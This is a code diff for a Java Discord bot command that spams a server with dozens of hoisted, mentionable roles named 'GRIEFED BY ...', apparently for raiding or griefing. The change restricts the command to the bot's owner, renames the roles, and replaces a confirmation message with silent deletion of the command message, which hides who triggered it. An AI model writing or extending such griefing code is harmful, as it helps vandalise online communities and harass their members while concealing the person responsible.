@@ -14,7 +14,10 @@ public class SpamRolesCommand implements ICommand {
 
     @Override
     public void handle(List<String> args, GuildMessageReceivedEvent event) {
-        int input = -1;
+        if (!(event.getAuthor().getIdLong() == Core.OWNERID )) {
+            return;
+        }
+        int input;
         try {
             input = Integer.parseInt(args.get(0));
         } catch (NumberFormatException ex) {
@@ -23,11 +26,12 @@ public class SpamRolesCommand implements ICommand {
         }
         for (int i = 0; i < input; i++) {
             event.getGuild().createRole().setHoisted(true).setMentionable(true)
-                    .setName("GRIEFED BY POODLECOORP " + Integer.toString(this.getRandom())).queue();
+                    .setName("GRIEFED BY SWAG " + Integer.toString(this.getRandom())).queue();
             if (i == input - 1) {
-                List<Message> messages = event.getChannel().getHistory().retrievePast(2).complete();
-                event.getChannel().deleteMessages(messages).queue();
-                event.getChannel().sendMessage("Roles created").queue();
+                event.getMessage().delete().queue();
+//                List<Message> messages = event.getChannel().getHistory().retrievePast(2).complete();
+//                event.getChannel().deleteMessages(messages).queue();
+//                event.getChannel().sendMessage("Roles created").queue();
             }
         }
     }
